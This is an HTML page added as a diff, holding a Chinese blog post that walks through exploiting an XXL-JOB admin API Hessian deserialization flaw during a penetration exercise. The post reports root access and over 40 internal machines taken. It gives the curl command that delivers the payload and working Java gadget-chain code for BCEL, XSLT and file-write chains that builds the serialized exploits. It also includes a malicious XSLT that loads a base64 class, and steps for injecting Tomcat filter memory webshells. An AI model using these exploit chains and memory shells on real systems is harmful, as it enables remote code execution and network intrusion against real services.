@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>记一次曲折的XXL-JOB API Hessian反序列化到Getshell - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="记一次曲折的XXL-JOB API Hessian反序列化到Getshell - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/11/07/[Web%E5%AE%9E%E6%88%98]%20%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84XXL-JOB%20API%20Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0Getshell/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-11-07T07:17:54.260Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>November</span>
+            <span>7,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">记一次曲折的XXL-JOB API Hessian反序列化到Getshell</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发奇安信攻防社区</p>
+<p>我们经常在CTF里见到Java反序列化的题，而如何从CTF过渡到实战中是一个坎儿，今天就说一次在hw中遇到的不出网Hessian反序列化问题。</p>
+<h1 id="一、启"><a href="#一、启" class="headerlink" title="一、启"></a>一、启</h1><p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-d3758d30ae6365a60180a52b05ec982bdcd982e0.png" alt="1698718919233-21f78f75-fc4a-4eb8-bbd5-5106a2920c1a.png"><br>最初就是打某护网发现一个XXL-JOB任务调度器，尝试了几番爆破无果后本来打算放弃了的，但是想到之前XXL-JOB爆出过一个Hessian反序列化的漏洞，就试探性的访问了一下<code>/api</code>接口，结果不出所料</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b35156f9a1e24d572a0f74cef6a50f269d2f87e9.png" alt="2.png"><br>（图中很多很奇怪的Filter名称不需要在意，这是我打的内存马的名字，我们一步步道来)</p>
+<h1 id="二、承"><a href="#二、承" class="headerlink" title="二、承"></a>二、承</h1><p>看到这一步我就豁然开朗，试探性的用了网上所说的Gadget去打了一波JNDI注入的链子，过程如下</p>
+<p>起一个恶意的JNDI服务先,然后用marshallsec去构造gadgets</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2aad072ecaf131dd95d9695272238b09922d8842.png" alt="4.png"><br>然后发送payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST -H &quot;Content-Type: x-application/hessian&quot; --data-binary @test.ser http://xxx:8080/xxl-job-admin/api</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-35af4bfcc015d3d433b0898ae4b979d52cf4394e.png" alt="5.png"><br>这里不用vps发包是因为我vps被ban了- -<br>可以看到是触发了lookup的，但是不出网，那怎么办呢？办法就只有一个了，那就是手打内存马</p>
+<h1 id="三、转"><a href="#三、转" class="headerlink" title="三、转"></a>三、转</h1><p>那我们就需要对源码进行分析，首先先去官网把漏洞版本的xxl-job下载下来看一下。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-f1602a138e3d58bb83f69126911f4c28d15a0b14.png" alt="6.png"><br>整体是基于springboot服务的，所以打内存马的话，我们只需要挑选一个Tomcat的Filter内存马即可，这里有2个问题</p>
+<ul>
+<li>第一个就是为什么不打springboot内存马</li>
+</ul>
+<p>这是因为Springboot的interceptor本质上就是Filter，但是从优先级来看Filter是更高的，而在xxl-job实际上是有几个默认的interceptor的，所以优先级不够。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-f43f11ca33e5eac02a41c8008df5b2eec8dba0a9.png" alt="7.png"></p>
+<ul>
+<li>为什么只能是Filter内存马</li>
+</ul>
+<p>鉴于上面说的默认interceptor，xxl-job内置有登录鉴权的interceptor，所以注入controller型的内存马，会因为优先级的问题而失效<br>那么我们最终就选择使用JMG工具生成一个冰蝎的Tomcat Filter内存马，JMG这款工具生成的内存马兼容性很强，比较推荐使用<br><a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-a3334e1cebd569c746b61909f1806e0564a88e9b.png" alt="8.png"><br>这样我们就得到了内存马的base64字节码了。我们怎么进行测试呢，github有maven项目源码，我们在help路由处对这个字节码进行加载。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-952dfe85274d92732bfcb5b4beb886aaa2a28689.png" alt="9.png"><br>咱们访问一下help路由</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-b962be869f1068a9efccdc057e30e7065dcddec3.png" alt="10.png"><br>访问两次出现这个就是注入成功了，因为打2次第二次会显示已存在，我们冰蝎连接试一下。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-78e3dfe8c561b2b9c1582084b9f0080a4ab8d15d.png" alt="11.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-fce30322c38b9414e05a8936af14443b386e2d65.png" alt="12.png"><br>显然我们是注入成功了。</p>
+<h1 id="四、再转"><a href="#四、再转" class="headerlink" title="四、再转"></a>四、再转</h1><p>那么我们的问题就来到了Gadgets上面，假如对nacos的raft反序列化熟悉的小伙伴应该不会缺链子，这里一开始是有很多种思路的</p>
+<ul>
+<li><p>JackSon反序列化</p>
+</li>
+<li><p>BCEL字节码加载</p>
+</li>
+<li><p>XSLT文件加载</p>
+</li>
+</ul>
+<h2 id="1、Jackson"><a href="#1、Jackson" class="headerlink" title="1、Jackson"></a>1、Jackson</h2><p>首先说到jackson，在AliyunCTF上爆出来的gadgets让绝大多数springframework都受到影响，因为他们都有Jackson依赖，可以打getter。但是在这个环境下版本过高，jackson无法利用<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-a302495a9767cad2f8abd11fd232024b89e8cf54.png" alt="13.png"><br>版本达到了2.8，在这个版本，BaseJsonNode可以触发getter的toString方法被移除了</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-6cf1b69bfbc3c7e6425fdef9139b0101b469e6c7.png" alt="14.png"><br>因此无法继续利用</p>
+<h2 id="2、BCEL"><a href="#2、BCEL" class="headerlink" title="2、BCEL"></a>2、BCEL</h2><p>在TCTF2022中出现了一个叫做Hessian-Onlyjdk的题，这个题的影响程度很高，不仅仅是在CTF更是在Realworld，他提供了一种JDK8原生的hessian gadgets，利用SwingLazyValue可以触发任意类的静态方法。<br>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianSwingLVBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Pkcs9可以换成MimeTypeParameterList</span></span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcelStr</span> <span class="operator">=</span> SerializeUtils.makeBcelStr(BcelRCE.class);</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;bcelStr,<span class="string">&quot;s&quot;</span>&#125;&#125;));</span><br><span class="line">        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(pkcs9Attributes));</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOut);</span><br><span class="line">        fileOut.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(pkcs9Attributes);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.rce;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里用到了<code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>这个类的<code>_main</code>静态方法，在方法内部可以加载BCEL字节码，会加载恶意类的<code>_main</code>方法。但是问题是，BCEL打内存马需要全反射的形式调用，Bcel类加载器不会加载springframework下的依赖，会抛出<code>ClassNotDefinded</code>的异常，它只能加载jdk包下的原生类，这一点就是一个限制，所以这里假如目标出网可以用这条gadgets，比较方便。</p>
+<h2 id="3、XSLT"><a href="#3、XSLT" class="headerlink" title="3、XSLT"></a>3、XSLT</h2><p>在nacos的raft反序列化里出现过这条链子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Pkcs9可以换成MimeTypeParameterList</span></span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XT&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, <span class="string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));</span><br><span class="line">        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOut);</span><br><span class="line">        fileOut.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(pkcs9Attributes);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该gadgets可在jdk8通杀，这是一条高可用的payload，用到了<code>com.sun.org.apache.xalan.internal.xslt.Process</code>的_main方法去加载恶意的xslt文件，我们可以在xslt文件内部执行任意语句，并且不受限。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:b64</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:ob</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:th</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">xmlns:ru</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;bs&quot;</span> <span class="attr">select</span>=<span class="string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;cl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rce&quot;</span> <span class="attr">select</span>=<span class="string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$rce&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>文件内容如上，加载恶意类，也就是内存马。那么为了加载xslt，我们还需要有一个payload去写入恶意的xslt，用到的gadgets还是一样的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.hessian;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianProxyLVFileWrite</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Pkcs9可以换成MimeTypeParameterList</span></span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="comment">//PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑</span></span><br><span class="line">        <span class="comment">//去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt</span></span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="string">&quot;E:\\payload.xslt&quot;</span>)&#125;));</span><br><span class="line">        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOut);</span><br><span class="line">        fileOut.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(pkcs9Attributes);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里选用JavaUtils的writeBytesTofilename即可。</p>
+<h1 id="五、合"><a href="#五、合" class="headerlink" title="五、合"></a>五、合</h1><p>确认了Gadgets和内存马后，我们就可以直接打两次poc了。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-2964211652fb7df59f703fedfbcbb67b1dfe17bc.png" alt="15.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-c9677f1e05cf4e0fc95ffe1156d30f08387a67bf.png" alt="16.png"><br>root权限连接成功~<br>这里我已经打入了，为了避免把服务打蹦就不把curl命令的结果发出来了，这里就以本机为例子，看看curl指令的结果。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-dd6b85df564dda890d98ca76ee1956ccd5f68e6e.png" alt="17.png"><br>第一发是写入payload</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-5c6c7bc69f0b4c9b5cfac9b1753c7772aaaf27e6.png" alt="18.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9b327bf2c85d91a3d5f14b5d32090451c89e4b9d.png" alt="19.png"><br>成功写入，第二发就是去加载xslt文件</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-9b815d78044ab1fa4ec0cecdd3205d70f62b9529.png" alt="20.png"><br>之后就可以像上面一样去连接冰蝎或者哥斯拉了。</p>
+<h1 id="六、不出网渗透"><a href="#六、不出网渗透" class="headerlink" title="六、不出网渗透"></a>六、不出网渗透</h1><p>这里目标经过测试是做了nginx的反向代理和负载均匀的，只能访问指定的目的ip</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-18ac5dd6efd2ee65563ce10e6e9f606081aa5163.png" alt="21.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-347c4febac8f6dba7bc5a73e50f226e03b05d520.png" alt="22.png"><br>在这里ICMP和DNS和TCP均不出网，这种情况下是无法上线c2的，因此我们可以选择正向代理进入，这里可以选择Suo5内存马</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-557f328fbad7af412279d780facd0e3d02b7cf9c.png" alt="23.png"><br>注入过后测试连接</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-1a4048759986131d2004a363234eb3cce4ccd255.png" alt="24.png"><br>可以看到连接是成功了的，但是半双工模式，这里就是因为nginx做了负载均衡，我们的请求会分发到2个内网机子，导致我们的正向代理发送不了完整的请求，也就有了图片中的连接关闭。这里我们是选择不做代理，直接使用冰蝎的虚拟终端获取完整tty继续渗透。</p>
+<h1 id="七、结"><a href="#七、结" class="headerlink" title="七、结"></a>七、结</h1><p>最终是拿下了40多台内网机子，算得上是一次比较曲折的不出网内网渗透了，希望上述提到的gadgets以及内存马可以给师傅们一些思路QWQ</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-73397ebd2c6fffaf26794ed488bc2a233c0e1e56.jpg" alt="1698984305318.jpg"><br>如果觉得还不错的话可以点个赞QAQ</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/渗透测试/" class="tag">#渗透测试</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/11/07/Atlassian%20Confluence%20CVE-2023-22518_22515%20Getshell%20%E9%80%9F%E9%80%9A/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Atlassian Confluence CVE-2023-22518_22515 Getshell 速通</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/11/06/N1CTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">N1CTF 2023 Web 赛后复现 Writeup</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
